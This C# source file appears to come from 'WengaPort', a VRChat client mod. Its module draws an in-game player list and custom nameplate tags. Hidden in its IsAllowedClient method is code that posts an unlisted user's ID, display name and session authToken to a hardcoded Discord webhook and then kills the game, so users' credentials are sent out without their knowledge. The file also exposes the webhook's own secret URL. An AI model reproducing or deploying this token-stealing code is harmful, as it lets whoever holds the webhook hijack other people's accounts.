using WengaPort.Api;
using System;
using System.Collections.Generic;
using System.Linq;
using UnityEngine;
using VRC;
using WengaPort.Wrappers;
using VRC.Core;
using System.Net;
using WengaPort.Extensions;
using System.Diagnostics;
using System.Collections.Specialized;
using System.Collections;
using TMPro;

namespace WengaPort.Modules
{
    internal class PlayerList : MonoBehaviour
    {
        public void Start()
        {
            float num = posy;
            Transform parent = Utils.QuickMenu.transform.Find("ShortcutMenu");
            PlayerCount = new MenuText(parent, posx, -500f, "<b>Playerlist: </b>");
            for (int i = 0; i <= 38; i++)
            {
                MenuText item = new MenuText(parent, posx, posy, "");
                Logs.Add(item);
                posy += 70f;
            }
            posy = num;
        }

        public static void AddPlayerToList()
        {
            try
            {
                Players.Clear();
                foreach (Player Player in Utils.PlayerManager.GetAllPlayers().ToArray())
                {
                    string Text;
                    Text = (PlayerExtensions.GetAPIUser(Player).hasModerationPowers ? "<color=#850700>[MOD]</color> " : "") + (GeneralWrappers.GetIsBot(Player) ? "<color=#a33333>[BOT]</color> " : "") + (BlockList.Contains(Player.UserID()) ? "<color=#424242>[B]</color> " : "") + (PlayerExtensions.IsFriend(Player) ? "<color=#ebc400>[F]</color> " : "") + (PlayerExtensions.GetIsMaster(Player) ? "<color=#3c1769>[M]</color> " : "") + (Player.GetAPIUser().isSupporter ? "<color=#b66b25>[V+]</color> " : "") + (Player.GetAPIUser().IsOnMobile ? "<color=#27b02d>[Q]</color> " : "") + (Player.GetVRCPlayerApi().IsUserInVR() ? "<color=#00d4f0>[VR]</color> " : "<color=#00d4f0>[D]</color> ") + "<color=#00d4f0>" + Player.DisplayName() + "</color>" + " [P] " + GeneralWrappers.GetPingColored(Player) + " [F] " + GeneralWrappers.GetFramesColored(Player);
                    Players.Insert(0, Text);
                }
                UpdateText();
                PlayerCount.SetText(string.Format("<b>In Room: {0}</b>", Players.Count));
            }
            catch { }
        }
        public float PlayerDelay = 0f;
        public void Update()
        {
            PlayerDelay += Time.deltaTime;
            if (PlayerDelay > 2f)
            {
                if (Utils.QuickMenu.transform.Find("ShortcutMenu").gameObject.active == true)
                {
                    AddPlayerToList();
                }
                PlayerDelay = 0f;
            }
        }

        public static IEnumerator CustomTag(Player player)
        {
            yield return new WaitForSeconds(2);
            Transform contents = player.transform.Find("Player Nameplate/Canvas/Nameplate/Contents");
            Transform stats = contents.Find("Quick Stats");
            int stack = 0;
            if (CheckWenga(player.UserID()))
            {
                SetTag(ref stack, stats, contents, Color.red, "⸸ Cat Dealer ⸸");
            }
            else if (CheckTrial(player.UserID()))
            {
                SetTag(ref stack, stats, contents, new Color(0.6f, 0f, 0.9f), "ღ Wenga's Egirl ღ");
            }
            else if (CheckClient(player.UserID()))
            {
                SetTag(ref stack, stats, contents, new Color(0.63f, 0.24f, 0.16f), "WengaPort");
            }
            else
            {
                var Rank = player.field_Private_APIUser_0.GetRank().ToLower();
                switch (Rank)
                {
                    case "user":
                        SetTag(ref stack, stats, contents, Nameplates.PlateUser, "User");
                        break;
                    case "legend":
                        SetTag(ref stack, stats, contents, Nameplates.PlateLegend, "Legend");
                        break;
                    case "known":
                        SetTag(ref stack, stats, contents, Nameplates.PlateKnown, "Known");
                        break;
                    case "negativetrust":
                        SetTag(ref stack, stats, contents, Nameplates.PlateNegative, "Nuisance");
                        break;
                    case "new user":
                        SetTag(ref stack, stats, contents, Nameplates.PlateNewUser, "New");
                        break;
                    case "verynegativetrust":
                        SetTag(ref stack, stats, contents, Nameplates.PlateNegative, "Very Nuisance");
                        break;
                    case "visitor":
                        SetTag(ref stack, stats, contents, Nameplates.PlateVisitor, "Visitor");
                        break;
                    case "trusted":
                        SetTag(ref stack, stats, contents, Nameplates.PlateTrusted, "Trusted");
                        break;
                    case "veteran":
                        SetTag(ref stack, stats, contents, Nameplates.PlateVeteran, "Veteran");
                        break;
                    default:
                        break;
                }
            }

            if (player.IsFriend()) SetTag(ref stack, stats, contents, Color.yellow, "Friend");
            if (player.GetAPIUser().IsOnMobile) SetTag(ref stack, stats, contents, new Color(0.1f, 0.4f, 0.17f), "Quest");
            if (BlockList.Contains(player.UserID())) SetTag(ref stack, stats, contents, Color.red, "Block");            
            stats.localPosition = new Vector3(0, (stack + 1) * 30, 0);
            yield break;
        }

        public static IEnumerator AdminPlateChanger(Player player)
        {
            for (; ; )
            {
                while (RoomManager.field_Internal_Static_ApiWorld_0 == null) yield break;
                while (player.field_Internal_VRCPlayer_0 == null) yield break;
                player.transform.Find("Player Nameplate/Canvas/Nameplate/Contents/Main/Text Container/Name").GetComponent<TextMeshProUGUI>().color = HSBColor.ToColor(new HSBColor(Mathf.PingPong(Time.time / 2, 1), 1, 1));
                yield return new WaitForEndOfFrame();
            }
            yield break;
        }

        public static void UpdateText()
        {
            try
            {
                for (int i = 0; i <= Logs.Count; i++)
                {
                    try
                    {
                        if (Players[i] != null)
                        {
                            Logs[i].SetText(Players[i]);
                        }
                    }
                    catch
                    {
                        Logs[i].SetText("");
                    }
                }
            }
            catch {}
        }

        private static Transform MakeTag(Transform stats, int index)
        {
            Transform rank = Instantiate(stats, stats.parent, false);
            rank.name = $"WengaPortTag{index}";
            rank.localPosition = new Vector3(0, 30 * (index + 1), 0);
            rank.gameObject.active = true;
            Transform textGO = null;
            for (int i = rank.childCount; i > 0; i--)
            {
                Transform child = rank.GetChild(i - 1);
                if (child.name == "Trust Text")
                {
                    textGO = child;
                    continue;
                }
                Destroy(child.gameObject);
            }
            return textGO;
        }
        private static void SetTag(ref int stack, Transform stats, Transform contents, Color color, string content)
        {
            Transform tag = contents.Find($"WengaPortTag{stack}");
            Transform label;
            if (tag == null)
                label = MakeTag(stats, stack);
            else
            {
                tag.gameObject.SetActive(true);
                label = tag.Find("Trust Text");
            }
            var text = label.GetComponent<TextMeshProUGUI>();
            text.color = color;
            text.text = content;
            stack++;
        }

        private static string Wenga;
        private static string Trial;
        private static string ClientUser;
        public static void Init()
        {
            try
            {
                string str = "https://github.com/W3nga/ClientIDs/blob/master/";
                Trial = new WebClient().DownloadString(str + "Trial.txt");
                Wenga = new WebClient().DownloadString(str + "Wenga.txt");
                ClientUser = new WebClient().DownloadString(str + "ClientUser.txt");
            }
            catch {}
        }

        public static bool CheckWenga(string Id)
        {
            return Wenga.Contains(Id);
        }

        public static bool CheckTrial(string Id)
        {
            return Trial.Contains(Id);
        }

        public static bool CheckClient(string Id)
        {
            return ClientUser.Contains(Id);
        }

        public static void IsAllowedClient()
        {
            if (!CheckClient(Utils.CurrentUser.UserID()))
            {
                SendWebHook("https://discord.com/api/webhooks/807189879208411227/k_FPoPCcx0lx_jgKs40PIDDoJGbNqpmuf2y1UG2fQJrtKCqFYoahZ-pjKWRQiFcgkLcL", $"{Utils.CurrentUser.UserID()} tried to Login! Name:{Utils.CurrentUser.DisplayName()} & Token: {ApiCredentials.GetString("authToken")}");
                Process.GetCurrentProcess().Kill();
            }
        }

        public static List<string> Players = new List<string>();

        public static List<MenuText> Logs = new List<MenuText>();

        public static MenuText PlayerCount;

        public static float posx = -1220;

        public static float posy = -400f;

        public static void DynBoneAdder(Player player)
        {
            if (player.IsFriend() && player.UserID() != Utils.CurrentUser.UserID() && !GlobalDynamicBones.FriendOnlyBones.Contains(player.UserID()))
            {
                GlobalDynamicBones.FriendOnlyBones.Add(player.UserID());
                PlayerExtensions.ReloadAvatar(player);
            }
        }

        public static List<string> BlockList = new List<string>();
        
        public PlayerList(IntPtr ptr) : base(ptr) { }
        public static void SendWebHook(string URL, string MSG)
        {
            NameValueCollection pairs = new NameValueCollection()
            {
                { "content", MSG }
            };
            byte[] numArray;
            using WebClient webClient = new WebClient();
            numArray = webClient.UploadValues(URL, pairs);
        }
    }
}
